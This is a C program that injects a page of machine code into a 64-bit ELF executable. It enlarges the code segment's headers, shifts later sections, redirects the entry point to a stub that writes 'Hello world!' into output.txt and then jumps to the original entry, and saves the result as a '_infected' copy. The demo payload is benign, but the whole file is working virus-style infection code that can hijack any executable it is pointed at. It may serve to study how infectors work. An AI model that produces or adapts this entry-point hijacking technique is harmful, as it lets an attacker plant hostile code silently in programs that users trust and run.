#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void extract_addr(long origin, char a[]) {
    int t = origin/(16*16);
    char b = origin % (16*16);
    a[0] = b;
    a[1] = t%(16*16);
    a[2] = t/(16*16);
}

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("input the filename\n");
        return 0;
    }
	char elf_ehdr[sizeof(Elf64_Ehdr)];
    Elf64_Ehdr* p_ehdr;
    p_ehdr = (Elf64_Ehdr*)elf_ehdr;
    FILE* origfile;
    origfile = fopen(argv[1], "rb");
    fread(elf_ehdr, sizeof(elf_ehdr), 1, origfile);
    Elf64_Addr origin_entry = p_ehdr->e_entry;
    char elf_phdr[sizeof(Elf64_Phdr)];
    Elf64_Phdr* p_phdr;
    p_phdr = (Elf64_Phdr*)elf_phdr;
    Elf64_Addr program_head_vaddr;
    Elf64_Xword program_head_size;
    Elf64_Off program_head_offset;
    int ph_position = -1;
    for (int i = 0;i < (int)p_ehdr->e_phnum; i++) {
        fread(elf_phdr, sizeof(elf_phdr), 1, origfile);
        if (p_phdr->p_vaddr <= origin_entry 
        && (p_phdr->p_vaddr + p_phdr->p_filesz) > origin_entry)
        {   
            program_head_offset = p_phdr->p_offset;
            program_head_vaddr = p_phdr->p_vaddr;
            program_head_size = p_phdr->p_filesz;
            ph_position = ftell(origfile);
            printf("find program header\n");
        }
    }
    fseek(origfile, (int)p_ehdr->e_shoff, SEEK_SET);
    int section_end_position = ftell(origfile);
    Elf64_Off entry_section_offset;
    Elf64_Xword entry_section_size;
    char elf_shdr[sizeof(Elf64_Shdr)];
    Elf64_Shdr* p_shdr = (Elf64_Shdr*)elf_shdr;
    Elf64_Addr new_entry;
    int sh_postion = -1;
    for (int i =0;i< (int)p_ehdr->e_shnum; i++) {
        fread(elf_shdr, sizeof(elf_shdr), 1, origfile);
        if (p_shdr->sh_addr+p_shdr->sh_size == program_head_vaddr+program_head_size) {
            entry_section_offset = p_shdr->sh_offset;
            entry_section_size = p_shdr->sh_size;
            new_entry = p_shdr->sh_addr + p_shdr->sh_size;
            sh_postion = ftell(origfile);
            printf("find section\n");
        }
    }

    FILE* injected_file = fopen("hello", "rb");
    int len = 0;
    fseek(injected_file, 0, SEEK_END);
    len = ftell(injected_file);
    fseek(injected_file, 0, SEEK_SET);
    int code_len = 0x50;
    int page_size = 4096;
    int data_entry = new_entry+code_len;
    int file_entry = new_entry+code_len+0x0e;
    char data_arr[3]={0};
    char file_arr[3]={0};
    char ori_arr[3]={0};
    extract_addr(origin_entry, ori_arr);
    extract_addr(data_entry, data_arr);
    extract_addr(file_entry, file_arr);
    printf("%x\n", data_entry);
    printf("%02x%02x%02x\n", data_arr[0], data_arr[1], data_arr[2]);
    char data[] = {
        0x50, 0x53, 0x51, 0x52,
        0x48, 0xc7, 0xc0, 0x05, 0x00, 0x00, 0x00,
        0x48, 0xc7, 0xc3, file_arr[0], file_arr[1], file_arr[2], 0x00,
        0x48, 0xc7, 0xc1, 0x41, 0x00, 0x00, 0x00,
        0x48, 0xc7, 0xc2, 0xa4, 0x01, 0x00, 0x00,
        0xcd, 0x80,
        0x48, 0x89, 0xc3,
        0x48, 0xc7, 0xc0, 0x04, 0x00, 0x00, 0x00,
        0x48, 0xc7, 0xc1, data_arr[0], data_arr[1], data_arr[2], 0x00,
        0x48, 0xc7, 0xc2, 0x0e, 0x00, 0x00, 0x00,
        0xcd, 0x80,
        0x48, 0xc7, 0xc0, 0x06, 0x00, 0x00, 0x00,
        0xcd, 0x80,
        0x5a, 0x59, 0x5b, 0x58,

        0xbd, ori_arr[0], ori_arr[1], ori_arr[2], 0x00, 0xff, 0xe5,

        0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x77, 0x6f, 0x72, 0x6c, 0x64, 0x21, 0x0a, 0x00,
        0x6f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x2e, 0x74, 0x78, 0x74, 0x00,

    };
    fseek(origfile, 0, SEEK_SET);
    char new_file_name[256];
    strcpy(new_file_name, argv[1]);
    strcat(new_file_name, "_infected");
    FILE* new_file = fopen(new_file_name, "wb");
    printf("new entry:%x\n", new_entry);
    p_ehdr->e_entry = new_entry;
    p_ehdr->e_shoff += page_size;
    fwrite(elf_ehdr, sizeof(elf_ehdr), 1, new_file);
    fread(elf_ehdr, sizeof(elf_ehdr), 1, origfile);
    printf("write entry ended\n");
    for (int i = 0; i < p_ehdr->e_phnum; ++i) {
        fread(elf_phdr, sizeof(elf_phdr), 1, origfile);
        if (p_phdr->p_offset == program_head_offset) {
            p_phdr->p_filesz += page_size;
            p_phdr->p_memsz += page_size;
        }  else if (p_phdr->p_offset > entry_section_offset) {
            p_phdr->p_offset += page_size;
        }
        fwrite(elf_phdr, sizeof(elf_phdr), 1, new_file);
    }
    printf("write program head done\n");
    char byte;
    while(ftell(origfile) != entry_section_offset+entry_section_size) {
        fread(&byte, sizeof(char), 1, origfile);
        fwrite(&byte, sizeof(char), 1, new_file);
    }
    fwrite(data, sizeof(data), 1, new_file);
    byte = 0x90;
    fwrite(&byte, sizeof(char), page_size- sizeof(data), new_file);
    printf("inject program done\n");

    while(ftell(origfile) != p_ehdr->e_shoff) {
        fread(&byte, sizeof(char), 1, origfile);
        fwrite(&byte, sizeof(char), 1, new_file);
    }
    printf("write last ended\n");
    for (int i = 0; i < p_ehdr->e_shnum; i++) {
        fread(elf_shdr, sizeof(elf_shdr), 1, origfile);
        if (p_shdr->sh_offset == entry_section_offset) {
            p_shdr->sh_size += page_size;
        } else if (p_shdr->sh_offset > entry_section_offset){
            p_shdr->sh_offset += page_size;
        }
        fwrite(elf_shdr, sizeof(elf_shdr), 1, new_file);
    }
    printf("modify sh ended\n");
    while(feof(origfile) == 0) {
        fread(&byte, sizeof(char), 1, origfile);
        fwrite(&byte, sizeof(char), 1, new_file);
    }
    printf("done\n");
    fclose(origfile);
    fclose(injected_file);
    fclose(new_file);

	return 0;
}